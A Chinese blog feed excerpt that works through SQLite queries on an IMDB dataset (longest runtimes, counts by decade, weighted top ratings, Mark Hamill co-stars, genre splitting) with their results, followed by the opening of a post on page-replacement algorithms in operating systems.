<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlite&gt; select distinct(type) from titles order by type;</span><br><span class="line">    movie</span><br><span class="line">    short</span><br><span class="line">    tvEpisode</span><br><span class="line">    tvMiniSeries</span><br><span class="line">    tvMovie</span><br><span class="line">    tvSeries</span><br><span class="line">    tvShort</span><br><span class="line">    tvSpecial</span><br><span class="line">    video</span><br><span class="line">    videoGame</span><br></pre></td></tr></table></figure>
<h1 id="q2"><a href="#q2" class="headerlink" title="q2"></a>q2</h1><p>查询每种类型中最长播放时间的title</p>
<ul>
<li>对于存在并列的情况，所有并列的条目均输出</li>
<li>输出types,primary titles,runtime minutes,按照type升序，若type相同则按照primary titles升序</li>
</ul>
<p>简单地，查询每种类型中最长播放时间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT type,max(runtime_minutes) FROM titles GROUP BY type;</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movie|51420</span><br><span class="line">short|461</span><br><span class="line">tvEpisode|1800</span><br><span class="line">tvMiniSeries|1755</span><br><span class="line">tvMovie|2112</span><br><span class="line">tvSeries|8400</span><br><span class="line">tvShort|60</span><br><span class="line">tvSpecial|5760</span><br><span class="line">video|5135</span><br><span class="line">videoGame|1500</span><br></pre></td></tr></table></figure>
<p>查询目标为runtime_minutes等于最大值的title</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WITH types(type, runtime_minutes) AS ( </span><br><span class="line">  SELECT type, MAX(runtime_minutes)</span><br><span class="line">    FROM titles</span><br><span class="line">    GROUP BY type</span><br><span class="line">)</span><br><span class="line">SELECT titles.type, titles.primary_title, titles.runtime_minutes</span><br><span class="line">  FROM titles</span><br><span class="line">  JOIN types</span><br><span class="line">  ON titles.runtime_minutes &#x3D;&#x3D; types.runtime_minutes AND titles.type &#x3D;&#x3D; types.type</span><br><span class="line">  ORDER BY titles.type, titles.primary_title</span><br><span class="line">  ;</span><br></pre></td></tr></table></figure>
<p>可通过with子句定义临时关系，再通过join运算限定title条目。</p>
<p>查询结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">movie|Logistics|51420</span><br><span class="line">short|Kuriocity|461</span><br><span class="line">tvEpisode|Téléthon 2012|1800</span><br><span class="line">tvMiniSeries|Kôya no yôjinbô|1755</span><br><span class="line">tvMovie|ArtQuench Presents Spirit Art|2112</span><br><span class="line">tvSeries|The Sharing Circle|8400</span><br><span class="line">tvShort|Paul McCartney Backstage at Super Bowl XXXIX|60</span><br><span class="line">tvShort|The People Next Door|60</span><br><span class="line">tvSpecial|Katy Perry Live: Witness World Wide|5760</span><br><span class="line">video|Midnight Movie Madness: 50 Movie Mega Pack|5135</span><br><span class="line">videoGame|Flushy Fish VR: Just Squidding Around|1500</span><br></pre></td></tr></table></figure>
<h1 id="q3"><a href="#q3" class="headerlink" title="q3"></a>q3</h1><p>列出所有类型的title，并给出相关条目的数量</p>
<ul>
<li>按照类型升序</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT type, count(*) AS title_count FROM titles GROUP BY type ORDER BY title_count ASC;</span><br></pre></td></tr></table></figure>
<p>查询结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tvShort|4075</span><br><span class="line">videoGame|9044</span><br><span class="line">tvSpecial|9107</span><br><span class="line">tvMiniSeries|10291</span><br><span class="line">tvMovie|45431</span><br><span class="line">tvSeries|63631</span><br><span class="line">video|90069</span><br><span class="line">movie|197957</span><br><span class="line">short|262038</span><br><span class="line">tvEpisode|1603076</span><br></pre></td></tr></table></figure>
<h1 id="q4"><a href="#q4" class="headerlink" title="q4"></a>q4</h1><p>按照每十年为间隔，统计首映的titles数目，例如<code>2010s|2789741</code></p>
<ul>
<li>年份按照类似2010s的格式输出，按照数目降序，<code>premiered</code>为<code>NULL</code>的条目不计入结果</li>
</ul>
<p>通过<code>group by</code>子句按照每十年分组,通过字符串运算在年份后添加s</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">  CAST(premiered&#x2F;10*10 AS TEXT) || &#39;s&#39; AS decade,</span><br><span class="line">  COUNT(*) AS num_movies</span><br><span class="line">  FROM titles</span><br><span class="line">  WHERE premiered is not null</span><br><span class="line">  GROUP BY decade</span><br><span class="line">  ORDER BY num_movies DESC</span><br><span class="line">  ;</span><br></pre></td></tr></table></figure>
<p>查询结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2010s|1050732</span><br><span class="line">2000s|494639</span><br><span class="line">1990s|211453</span><br><span class="line">1980s|119258</span><br><span class="line">1970s|99707</span><br><span class="line">1960s|75237</span><br><span class="line">1950s|39554</span><br><span class="line">1910s|26596</span><br><span class="line">1920s|13153</span><br><span class="line">1930s|11492</span><br><span class="line">1940s|10011</span><br><span class="line">1900s|9586</span><br><span class="line">2020s|2492</span><br><span class="line">1890s|2286</span><br><span class="line">1880s|22</span><br><span class="line">1870s|1</span><br></pre></td></tr></table></figure>
<h1 id="q5"><a href="#q5" class="headerlink" title="q5"></a>q5</h1><p>按照每十年为间隔，统计对应首映的titles数目百分比，例如 <code>2010s|45.7042</code></p>
<ul>
<li>百分比为对应的首映数目除以总titles数目，titles算入<code>premiered</code>为<code>NULL</code>的条目，结果舍入到小数点后四位</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT</span><br><span class="line">  CAST(premiered&#x2F;10*10 AS TEXT) || &#39;s&#39; AS decade,</span><br><span class="line">  ROUND(CAST(COUNT(*) AS REAL) &#x2F; (SELECT COUNT(*) FROM titles) * 100.0, 4) as percentage</span><br><span class="line">  FROM titles</span><br><span class="line">  WHERE premiered is not null</span><br><span class="line">  GROUP BY decade</span><br><span class="line">  ORDER BY percentage DESC, decade ASC</span><br><span class="line">  ;</span><br></pre></td></tr></table></figure>
<p>查询结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2010s|45.7891</span><br><span class="line">2000s|21.5555</span><br><span class="line">1990s|9.2148</span><br><span class="line">1980s|5.1971</span><br><span class="line">1970s|4.3451</span><br><span class="line">1960s|3.2787</span><br><span class="line">1950s|1.7237</span><br><span class="line">1910s|1.159</span><br><span class="line">1920s|0.5732</span><br><span class="line">1930s|0.5008</span><br><span class="line">1940s|0.4363</span><br><span class="line">1900s|0.4177</span><br><span class="line">2020s|0.1086</span><br><span class="line">1890s|0.0996</span><br><span class="line">1880s|0.001</span><br><span class="line">1870s|0.0</span><br></pre></td></tr></table></figure>
<h1 id="q6"><a href="#q6" class="headerlink" title="q6"></a>q6</h1><p>列出转播次数的titles前十</p>
<ul>
<li>输出primary title和对应的数目</li>
</ul>
<p>和q2类似，可通过with子句定义临时关系，<code>LIMIT 10</code>限定输出条目的数目再通过join运算限定title条目。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WITH translations AS (</span><br><span class="line">  SELECT title_id, count(*) as num_translations </span><br><span class="line">    FROM akas </span><br><span class="line">    GROUP BY title_id </span><br><span class="line">    ORDER BY num_translations DESC, title_id </span><br><span class="line">    LIMIT 10</span><br><span class="line">)</span><br><span class="line">SELECT titles.primary_title, translations.num_translations</span><br><span class="line">  FROM translations</span><br><span class="line">  JOIN titles</span><br><span class="line">  ON titles.title_id &#x3D;&#x3D; translations.title_id</span><br><span class="line">  ORDER BY translations.num_translations DESC</span><br><span class="line">  ;</span><br></pre></td></tr></table></figure>
<p>查询结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mutant Virus: Vol. 1|126</span><br><span class="line">The Good, the Bad and the Ugly|73</span><br><span class="line">Star Wars: Episode V - The Empire Strikes Back|71</span><br><span class="line">Dr. Strangelove or: How I Learned to Stop Worrying and Love the Bomb|68</span><br><span class="line">Raiders of the Lost Ark|62</span><br><span class="line">Star Wars: Episode VII - The Force Awakens|62</span><br><span class="line">The Shawshank Redemption|61</span><br><span class="line">Once Upon a Time in the West|60</span><br><span class="line">Indiana Jones and the Kingdom of the Crystal Skull|60</span><br><span class="line">Airplane!|59</span><br></pre></td></tr></table></figure>
<h1 id="q7"><a href="#q7" class="headerlink" title="q7"></a>q7</h1><p>列出IMDB中电影权重最高的250个</p>
<p>权重的计算方式为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Weighted rating (WR) &#x3D; (v&#x2F;(v+m)) * R + (m&#x2F;(v+m)) * C</span><br></pre></td></tr></table></figure>
<ul>
<li>R为电影平均评分</li>
<li>v为评分人数</li>
<li>m为25000</li>
<li>C为所有电影的平均权重</li>
</ul>
<p><code>weight</code>的计算放入<code>select</code>语句中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WITH</span><br><span class="line">  av(average_rating) AS (</span><br><span class="line">    SELECT SUM(rating * votes) &#x2F; SUM(votes)</span><br><span class="line">      FROM ratings</span><br><span class="line">      JOIN titles</span><br><span class="line">      ON titles.title_id &#x3D;&#x3D; ratings.title_id AND titles.type &#x3D;&#x3D; &quot;movie&quot; </span><br><span class="line">  ),</span><br><span class="line">  mn(min_rating) AS (SELECT 25000.0)</span><br><span class="line">SELECT</span><br><span class="line">  primary_title,</span><br><span class="line">  (votes &#x2F; (votes + min_rating)) * rating + (min_rating &#x2F; (votes + min_rating)) * average_rating as weighed_rating</span><br><span class="line">  FROM ratings, av, mn</span><br><span class="line">  JOIN titles</span><br><span class="line">  ON titles.title_id &#x3D;&#x3D; ratings.title_id and titles.type &#x3D;&#x3D; &quot;movie&quot;</span><br><span class="line">  ORDER BY weighed_rating DESC</span><br><span class="line">  LIMIT 250</span><br><span class="line">  ;</span><br></pre></td></tr></table></figure>
<p>榜单如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The Shawshank Redemption|9.27408375213064</span><br><span class="line">Pulp Fiction|8.87296068706845</span><br><span class="line">The Lord of the Rings: The Return of the King|8.87023538818413</span><br><span class="line">Schindler&#39;s List|8.85944837786486</span><br><span class="line">12 Angry Men|8.8274654312365</span><br><span class="line">Forrest Gump|8.77394665505175</span><br><span class="line">The Good, the Bad and the Ugly|8.73410047935658</span><br><span class="line">The Matrix|8.67379043068514</span><br><span class="line">The Lord of the Rings: The Two Towers|8.67073273467584</span><br><span class="line">Star Wars: Episode V - The Empire Strikes Back|8.66258036565461</span><br><span class="line">Goodfellas|8.65679704067696</span><br><span class="line">One Flew Over the Cuckoo&#39;s Nest|8.65294416076491</span><br><span class="line">The Mountain II|8.61725087838868</span><br><span class="line">City of God|8.54342805417796</span><br><span class="line">Gladiator|8.47143742708625</span><br><span class="line">Back to the Future|8.46332853886572</span><br><span class="line">Léon: The Professional|8.46292056565729</span><br><span class="line">Avengers: Infinity War|8.4506845289751</span><br><span class="line">Psycho|8.4373696976068</span><br><span class="line">Rear Window|8.41674755149826</span><br><span class="line">Once Upon a Time in the West|8.38089735258473</span><br><span class="line">WALL·E|8.36472733136252</span><br><span class="line">Raiders of the Lost Ark|8.36071764723241</span><br><span class="line">The Shining|8.35937143360229</span><br><span class="line">Alien|8.35552530090484</span><br><span class="line">Cinema Paradiso|8.3444698366033</span><br><span class="line">Apocalypse Now|8.34271721766924</span><br><span class="line">Grave of the Fireflies|8.34191265540178</span><br><span class="line">Oldboy|8.33209348956415</span><br><span class="line">Dr. Strangelove or: How I Learned to Stop Worrying and Love the Bomb|8.3250687044724</span><br><span class="line">Once Upon a Time in America|8.29149205920628</span><br><span class="line">Spider-Man: Into the Spider-Verse|8.27944770565499</span><br><span class="line">Inglourious Basterds|8.27361869242351</span><br><span class="line">American Beauty|8.26993451202779</span><br><span class="line">Reservoir Dogs|8.26439627161116</span><br><span class="line">Requiem for a Dream|8.25798876833464</span><br><span class="line">A Clockwork Orange|8.25742341547537</span><br><span class="line">Toy Story 3|8.25734107724815</span><br><span class="line">Scarface|8.25590438979589</span><br><span class="line">Full Metal Jacket|8.25210853826772</span><br><span class="line">Sunset Blvd.|8.23933898857354</span><br><span class="line">Amadeus|8.21589004599775</span><br><span class="line">Vertigo|8.21216347202948</span><br><span class="line">Like Stars on Earth|8.20481373841464</span><br><span class="line">Your Name.|8.19983566375586</span><br><span class="line">North by Northwest|8.1975172347387</span><br><span class="line">Batman Begins|8.17704665931913</span><br><span class="line">V for Vendetta|8.17129916924205</span><br><span class="line">Die Hard|8.16240649720068</span><br><span class="line">Lock, Stock and Two Smoking Barrels|8.14585507926427</span><br><span class="line">Casino|8.13629764272654</span><br><span class="line">Unforgiven|8.12365074764615</span><br><span class="line">The Apartment|8.12061011853697</span><br><span class="line">Chinatown|8.10376481333931</span><br><span class="line">My Neighbor Totoro|8.09442185609386</span><br><span class="line">Green Book|8.09074160238658</span><br><span class="line">Finding Nemo|8.07145216202776</span><br><span class="line">Catch Me If You Can|8.06592479759894</span><br><span class="line">The Grand Budapest Hotel|8.06129693202741</span><br><span class="line">Blade Runner|8.06098971608469</span><br><span class="line">Fargo|8.05647629910042</span><br><span class="line">Prisoners|8.05390469414222</span><br><span class="line">The Kid|8.05287532584739</span><br><span class="line">Rush|8.03898582269203</span><br><span class="line">Hacksaw Ridge|8.03551702468201</span><br><span class="line">The Seventh Seal|8.03407390030423</span><br><span class="line">The Princess Bride|8.03359206319394</span><br><span class="line">Platoon|8.03211473247254</span><br><span class="line">PK|8.02907703728921</span><br><span class="line">Monty Python&#39;s Life of Brian|8.02901738104703</span><br><span class="line">Gone with the Wind|8.01162552164356</span><br><span class="line">Before Sunrise|8.00325016258364</span><br><span class="line">Ben-Hur|7.98708858673506</span><br><span class="line">The Elephant Man|7.98656566725627</span><br><span class="line">The Treasure of the Sierra Madre|7.98183759819495</span><br><span class="line">Aynabaji|7.97740941967294</span><br><span class="line">Yojimbo|7.97326922828868</span><br><span class="line">Star Wars: Episode VII - The Force Awakens|7.97147281541043</span><br><span class="line">Slumdog Millionaire|7.97003387503103</span><br><span class="line">Monsters, Inc.|7.96993549888079</span><br><span class="line">Sin City|7.96864677307258</span><br><span class="line">X-Men: Days of Future Past|7.96426564397762</span><br><span class="line">Ratatouille|7.96198738026476</span><br><span class="line">Jaws|7.95693515580935</span><br><span class="line">Her|7.95337602084149</span><br><span class="line">Cool Hand Luke|7.95284437581594</span><br><span class="line">Akira|7.9466594640111</span><br><span class="line">In the Name of the Father|7.94653731881204</span><br><span class="line">Big Fish|7.94417520197508</span><br><span class="line">Zootopia|7.94391037425039</span><br><span class="line">Barry Lyndon|7.93804803727936</span><br><span class="line">La Haine|7.93713874007203</span><br><span class="line">Network|7.93673499353362</span><br><span class="line">Ikiru|7.93587006088359</span><br><span class="line">Harakiri|7.93442534185635</span><br><span class="line">On the Waterfront|7.93384958766431</span><br><span class="line">Drishyam|7.9316664137302</span><br><span class="line">The Chaos Class Failed the Class|7.92209636316521</span><br><span class="line">Magnolia|7.92151783450757</span><br><span class="line">Swades|7.91791802696218</span><br><span class="line">Children of Heaven|7.91488724265187</span><br><span class="line">Tosun Pasa|7.91175384887872</span><br><span class="line">Dog Day Afternoon|7.90497209143548</span><br><span class="line">Before Sunset|7.90135907545106</span><br><span class="line">Memories of Murder|7.89983909706083</span><br><span class="line">Ip Man|7.89530989242938</span><br><span class="line">Chak de! India|7.89380214739519</span><br><span class="line">Munna Bhai M.B.B.S.|7.88766873353758</span><br><span class="line">The 400 Blows|7.88236058087742</span><br><span class="line">Elite Squad|7.88128931930257</span><br><span class="line">Cinderella Man|7.87893854172733</span><br><span class="line">Judgment at Nuremberg|7.87703872647609</span><br><span class="line">Ayla: The Daughter of War|7.87111640888977</span><br><span class="line">Toy Story 4|7.86727079414856</span><br><span class="line">District 9|7.86716566170036</span><br><span class="line">Edge of Tomorrow|7.86401183134919</span><br><span class="line">Searching for Sugar Man|7.86361014282595</span><br><span class="line">Thor: Ragnarok|7.86067171002219</span><br><span class="line">Harry Potter and the Prisoner of Azkaban|7.86009831177006</span><br><span class="line">The Handmaiden|7.86005695016839</span><br><span class="line">Toy Story 2|7.85903363434152</span><br><span class="line">The Bourne Identity|7.85871357953152</span><br><span class="line">Three Colors: Red|7.8571771641382</span><br><span class="line">Edward Scissorhands|7.85308436175456</span><br><span class="line">Nightcrawler|7.85238182329928</span><br><span class="line">Castle in the Sky|7.8494569785608</span><br><span class="line">Paris, Texas|7.84540229570821</span><br><span class="line">The Breakfast Club|7.84009539226878</span><br><span class="line">Ghost in the Shell|7.8358170251987</span><br><span class="line">Mulholland Dr.|7.83476463500115</span><br><span class="line">Strangers on a Train|7.8340265331899</span><br><span class="line">Papillon|7.83230035374453</span><br><span class="line">The Raid 2|7.82177754544252</span><br><span class="line">The Artist|7.81451845636192</span><br><span class="line">The Man Who Shot Liberty Valance|7.8078751132418</span><br><span class="line">True Romance|7.80358074659557</span><br><span class="line">All the President&#39;s Men|7.80348137201329</span><br><span class="line">A Streetcar Named Desire|7.80156298305092</span><br><span class="line">My Name Is Khan|7.80054788180083</span><br><span class="line">Patton|7.79504441225479</span><br><span class="line">Tokyo Story|7.79422849952735</span><br><span class="line">The Blues Brothers|7.79298260954459</span><br><span class="line">The Man from Earth|7.78857212574483</span><br><span class="line">Capernaum|7.78563829871188</span><br><span class="line">Spider-Man: Far from Home|7.78561846386015</span><br><span class="line">Vikram Vedha|7.78373473224346</span><br><span class="line">Titanic|7.78157715805354</span><br><span class="line">The Hobbit: An Unexpected Journey|7.77554863836764</span><br><span class="line">The Passion of Joan of Arc|7.77408091487195</span><br><span class="line">High and Low|7.77213704112255</span><br><span class="line">Sing Street|7.76915812623775</span><br><span class="line">The Legend of 1900|7.76815835496063</span><br><span class="line">Elite Squad: The Enemy Within|7.76812044894699</span><br><span class="line">Fanny and Alexander|7.76800472456941</span><br><span class="line">Taken|7.76769012246336</span><br><span class="line">The Straight Story|7.76752395340217</span><br><span class="line">Kahaani|7.76720011579587</span><br><span class="line">Ocean&#39;s Eleven|7.76364685071376</span><br><span class="line">The Sea Inside|7.76289022497323</span><br><span class="line">O.J.: Made in America|7.76250676256312</span><br><span class="line">Before Midnight|7.76132220796731</span><br><span class="line">Home|7.76025351500213</span><br><span class="line">Back to the Future Part II|7.76009005121133</span><br><span class="line">Spring, Summer, Fall, Winter... and Spring|7.7592446422894</span><br><span class="line">Manhattan|7.7591232226754</span><br><span class="line">Crash|7.757187612945</span><br><span class="line">The Girl with the Dragon Tattoo|7.75600754037541</span><br><span class="line">Big Hero 6|7.7544767707715</span><br><span class="line">Predator|7.75096576853116</span><br><span class="line">Spartacus|7.75079774492003</span><br><span class="line">Isle of Dogs|7.7494869658895</span><br><span class="line">The Fighter|7.74677127042658</span><br><span class="line">The Game|7.7466716184388</span><br><span class="line">The Big Short|7.7461656518056</span><br><span class="line">Moonrise Kingdom|7.74269388072724</span><br><span class="line">Pather Panchali|7.74145616936336</span><br><span class="line">Doctor Zhivago|7.74112370242397</span><br><span class="line">Apocalypto|7.73848649857271</span><br><span class="line">About Time|7.7377698449424</span><br><span class="line">Gattaca|7.73647859452984</span><br><span class="line">What Ever Happened to Baby Jane?|7.73539364991903</span><br><span class="line">The Marathon Family|7.73428987458458</span><br><span class="line">Crouching Tiger, Hidden Dragon|7.73132118708057</span><br><span class="line">Sunrise|7.72522570382843</span><br><span class="line">Manchester by the Sea|7.72481321224648</span><br><span class="line">La Dolce Vita|7.72473610906825</span><br><span class="line">Halloween|7.72149520973176</span><br><span class="line">Sherlock Jr.|7.72122901074544</span><br><span class="line">What&#39;s Eating Gilbert Grape|7.71837046863796</span><br><span class="line">Diabolique|7.71738924368521</span><br><span class="line">Remember the Titans|7.7131373150204</span><br><span class="line">Amour|7.71206424086562</span><br><span class="line">Earthlings|7.71112168098164</span><br><span class="line">Hidden Figures|7.70836846509536</span><br><span class="line">The Boy in the Striped Pajamas|7.70750686722645</span><br><span class="line">Throne of Blood|7.70486190012118</span><br><span class="line">Nosferatu|7.70479615314119</span><br><span class="line">The Best Years of Our Lives|7.70404091573498</span><br><span class="line">La Strada|7.7035894202021</span><br><span class="line">Blue Velvet|7.70348849922288</span><br><span class="line">Ed Wood|7.70011913851453</span><br><span class="line">Carry On, Munna Bhai|7.6960703370653</span><br><span class="line">The Insider|7.69589363902872</span><br><span class="line">Rio Bravo|7.69547902962826</span><br><span class="line">Do the Right Thing|7.69470637286005</span><br><span class="line">G.O.R.A.|7.69143691201405</span><br><span class="line">John Wick: Chapter 3 - Parabellum|7.69042140474976</span><br><span class="line">The Big Sleep|7.69022732193082</span><br><span class="line">The Best of Youth|7.68939089676166</span><br><span class="line">The Wild Bunch|7.68732321899666</span><br><span class="line">Evil Dead II|7.68698809399903</span><br><span class="line">Airlift|7.68482585880285</span><br><span class="line">Who&#39;s Singin&#39; Over There?|7.68275319170322</span><br><span class="line">The King of the Street Cleaners|7.68007124396815</span><br><span class="line">Blue Is the Warmest Color|7.67888277323536</span><br><span class="line">300|7.67811080177943</span><br><span class="line">The Hangover|7.67745136243525</span><br><span class="line">The Chaos Class Is on Vacation|7.67701815540533</span><br><span class="line">Kramer vs. Kramer|7.6734998783239</span><br><span class="line">Special 26|7.67149062884843</span><br><span class="line">Harold and Maude|7.67125075421178</span><br><span class="line">Breathless|7.66994880180493</span><br><span class="line">3-Iron|7.66894856428393</span><br><span class="line">Glory|7.66830445780438</span><br><span class="line">Awakenings|7.66753775055519</span><br><span class="line">Star Trek Into Darkness|7.66655348768595</span><br><span class="line">To Be or Not to Be|7.66618772896992</span><br><span class="line">A Silent Voice|7.66616985054611</span><br><span class="line">Get Out|7.66418042868228</span><br><span class="line">The Fifth Element|7.66340814153364</span><br><span class="line">Zodiac|7.66276470401316</span><br><span class="line">Empire of the Sun|7.66123857830932</span><br><span class="line">Lost in Translation|7.66075124608843</span><br><span class="line">Man with a Movie Camera|7.66048361595785</span><br><span class="line">Tangled|7.66012044434097</span><br><span class="line">Once|7.65980150013791</span><br><span class="line">Midnight in Paris|7.65893069763627</span><br><span class="line">The King of Kong: A Fistful of Quarters|7.65818054427474</span><br><span class="line">Wreck-It Ralph|7.6578968805438</span><br><span class="line">The Salt of the Earth|7.6573311856226</span><br><span class="line">The Fault in Our Stars|7.65410038215701</span><br><span class="line">Time of the Gypsies|7.65354312829129</span><br><span class="line">Lucky Number Slevin|7.64972806598217</span><br><span class="line">Whisper of the Heart|7.64876091986559</span><br><span class="line">O Brother, Where Art Thou?|7.64584931637816</span><br><span class="line">Talvar|7.64560053612369</span><br><span class="line">Donnie Brasco|7.6439766475949</span><br><span class="line">As Good as It Gets|7.64393017265743</span><br><span class="line">The Motorcycle Diaries|7.64367118785382</span><br><span class="line">The Girl with the Red Scarf|7.64023075719264</span><br></pre></td></tr></table></figure>
<p>榜单第一是肖申克的救赎,惊了！</p>
<h1 id="q8"><a href="#q8" class="headerlink" title="q8"></a>q8</h1><p>列出和Mark Hamill合作过的男演员/女演员的数量</p>
<ul>
<li>仅输出数量</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WITH hamill_titles AS (</span><br><span class="line">  SELECT DISTINCT(crew.title_id)</span><br><span class="line">    FROM people</span><br><span class="line">    JOIN crew</span><br><span class="line">    ON crew.person_id &#x3D;&#x3D; people.person_id AND people.name &#x3D;&#x3D; &quot;Mark Hamill&quot; AND people.born &#x3D;&#x3D; 1951</span><br><span class="line">)</span><br><span class="line">SELECT COUNT(DISTINCT(crew.person_id))</span><br><span class="line">  FROM crew</span><br><span class="line">  WHERE (crew.category &#x3D;&#x3D; &quot;actor&quot; OR crew.category &#x3D;&#x3D; &quot;actress&quot;) AND crew.title_id in hamill_titles</span><br><span class="line">;</span><br></pre></td></tr></table></figure>
<p>查询结果为<code>206</code></p>
<h1 id="q9"><a href="#q9" class="headerlink" title="q9"></a>q9</h1><p>按照字典序列出Mark Hamill(生于1951年)和George Lucas(生于1944年)共同参演的作品</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WITH hamill_movies(title_id) AS (</span><br><span class="line">  SELECT crew.title_id</span><br><span class="line">    FROM crew</span><br><span class="line">    JOIN people</span><br><span class="line">    ON crew.person_id &#x3D;&#x3D; people.person_id AND people.name &#x3D;&#x3D; &quot;Mark Hamill&quot; AND people.born &#x3D;&#x3D; 1951</span><br><span class="line">)</span><br><span class="line">SELECT titles.primary_title</span><br><span class="line">  FROM crew</span><br><span class="line">  JOIN people</span><br><span class="line">  ON crew.person_id &#x3D;&#x3D; people.person_id AND people.name &#x3D;&#x3D; &quot;George Lucas&quot; AND people.born &#x3D;&#x3D; 1944 AND crew.title_id IN hamill_movies</span><br><span class="line">  JOIN titles</span><br><span class="line">  ON crew.title_id &#x3D;&#x3D; titles.title_id AND titles.type &#x3D;&#x3D; &quot;movie&quot;</span><br><span class="line">  ORDER BY titles.primary_title</span><br><span class="line">;</span><br></pre></td></tr></table></figure>
<p>查询结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Star Wars: Episode V - The Empire Strikes Back</span><br></pre></td></tr></table></figure>
<p>仅有一部电影</p>
<h1 id="q10"><a href="#q10" class="headerlink" title="q10"></a>q10</h1><p>列出所有不同的标签和相关的<code>titles</code>数目</p>
<p>不同标签之间以逗号间隔，所以需要从<code>genre</code>中提取出对应的标签信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">WITH RECURSIVE split(genre, rest) AS (</span><br><span class="line">  SELECT &#39;&#39;, genres || &#39;,&#39; FROM titles WHERE genres !&#x3D; &quot;\N&quot;</span><br><span class="line">   UNION ALL</span><br><span class="line">  SELECT substr(rest, 0, instr(rest, &#39;,&#39;)),</span><br><span class="line">         substr(rest, instr(rest, &#39;,&#39;)+1)</span><br><span class="line">    FROM split</span><br><span class="line">   WHERE rest !&#x3D; &#39;&#39;</span><br><span class="line">)</span><br><span class="line">SELECT genre, count(*) as genre_count</span><br><span class="line">  FROM split </span><br><span class="line"> WHERE genre !&#x3D; &#39;&#39;</span><br><span class="line"> GROUP BY genre</span><br><span class="line"> ORDER BY genre_count DESC;</span><br></pre></td></tr></table></figure>
<p>查询结果为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Drama|620063</span><br><span class="line">Comedy|486163</span><br><span class="line">Short|310619</span><br><span class="line">Documentary|222187</span><br><span class="line">Talk-Show|215144</span><br><span class="line">Romance|211462</span><br><span class="line">Family|159035</span><br><span class="line">News|148941</span><br><span class="line">Animation|115998</span><br><span class="line">Reality-TV|113180</span><br><span class="line">Music|105724</span><br><span class="line">Crime|99019</span><br><span class="line">Action|97544</span><br><span class="line">Adventure|81686</span><br><span class="line">Game-Show|75169</span><br><span class="line">Adult|65704</span><br><span class="line">Sport|48855</span><br><span class="line">Fantasy|48341</span><br><span class="line">Mystery|47155</span><br><span class="line">Horror|41552</span><br><span class="line">Thriller|40664</span><br><span class="line">History|31675</span><br><span class="line">Sci-Fi|31441</span><br><span class="line">Biography|27001</span><br><span class="line">Musical|17939</span><br><span class="line">Western|9811</span><br><span class="line">War|9309</span><br><span class="line">Film-Noir|322</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Systems</category>
      </categories>
      <tags>
        <tag>database systems</tag>
      </tags>
  </entry>
  <entry>
    <title>页面置换算法</title>
    <url>/systems/paging/</url>
    <content><![CDATA[<p> 虚拟内存只把部分程序放到内存中，虚拟内存单元不一定由实际物理内存单元对应，因此访问的部分可能不在内存中。在内存中无空闲页时，访问的页面必须替换已经存在的某一页面才能放入到内存中。如何选择替换页由页面置换算法实现，其中根据是否区分不同进程的页面，分为局部置换算法和全局置换算法。</p>
<a id="more"></a>

<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p><strong>功能</strong></p>
<p>当出现缺页异常时 需调入新页面且内存已满 置换算法选择被置换的物理页面</p>
<p><strong>设计目标</strong></p>
<ul>
<li>尽可能地减少页面调入调出次数(与程序访问特征有关)</li>
<li>把未来不再访问或短期内不访问的页面调出</li>
</ul>
<p><strong>页面锁定</strong></p>
<ul>
<li>描述必须常驻内存的逻辑页面</li>
<li>通常是操作系统的关键代码(必须存在内存中)或要求响应速度的代码和数据(外存中访问太慢)</li>
<li>通过页表中的锁定标志位 (Lock bit)来标记</li>
</ul>
<p><strong>评价方法</strong></p>
<ul>
<li>模拟页面置换行为，记录产生缺页的次数</li>
<li>更少的缺页，更好的性能</li>
</ul>
<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p><strong>局部页面置换算法</strong></p>
<ul>
<li>置换页面的选择范围仅限于当前进程占用的物理页面内</li>
<li>最优算法(预测未来)、先进先出算法、最近最久未使用算法(统计过去)</li>
<li>时钟算法、最不常用算法(近似处理)</li>
</ul>
<p><strong>全局页面置换算法</strong></p>
<ul>
<li>置换页面的选择范围是所有可换出的物理页面，不关注使用进程</li>
<li>工作集算法、缺页率算法</li>
</ul>
<h1 id="局部页面置换算法"><a href="#局部页面置换算法" class="headerlink" title="局部页面置换算法"></a>局部页面置换算法</h1><h2 id="最优页面置换算法"><a href="#最优页面置换算法" class="headerlink" title="最优页面置换算法"></a>最优页面置换算法</h2><p>置换在未来最长时间不访问的页面</p>
<p><strong>算法实现</strong></p>
<ul>
<li>缺页时，计算内存中每个逻辑页面的下一次访问时间</li>
<li>选择未来最长时间不访问的页面</li>
</ul>
<p><strong>算法特征</strong></p>
<ul>
<li>缺页最少，是理想情况</li>
<li>实际系统中无法实现，每次访问序列不同</li>
<li>无法预知每个页面在下次访问前的等待时间</li>
<li>缺页最少，一般作为置换算法的性能评价依据</li>
</ul>
<p><strong>最优置换算法示例</strong></p>
<p><img src="https://i.loli.net/2019/07/27/5d3c306e9f17687822.png"></p>
